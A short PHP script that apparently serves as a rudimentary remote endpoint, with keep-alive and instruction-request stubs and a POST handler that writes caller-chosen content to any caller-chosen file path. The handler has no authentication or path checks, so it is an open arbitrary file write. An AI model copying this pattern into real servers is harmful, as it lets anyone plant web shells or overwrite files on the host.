<?php
$DEBUG = true;
function write($msg) {
  echo "$msg\n";
}

function get($arr, $param) {
  if (isset($arr[$param])) {
    return $arr[$param];
  } else {
    write("No parameter: $param found in array");
  }
}

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
  if (isset($_GET['keep-alive'])) {
    echo 'alive';
  } else if (isset($_GET['request-instruction'])) {
    // Code here to possibly read instructions from a file
    // And then a shell script to io the file
    echo 'these are instructions';
  } else if (isset($_GET['request-date-time'])) {
    echo 'this is the date and time';
  }
} else if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $post_mode = get($_POST, 'mode');
  if ($post_mode == 'write-to-file') {
    $file_path = get($_POST, 'file-path');
    $content = get($_POST, 'content');
    if(!file_exists($file_path)){
      write("File: $file_path doesn't exist. Will create");
    }
    $file_handle = fopen($file_path, "w");
    if ($file_handle == false) {
      write("Unable to open file: $file_path");
    } else {
      fwrite($file_handle, $content);
      fclose($file_handle);
      write("Successfully wrote content to file: $file_path");
    }
  }
}
?>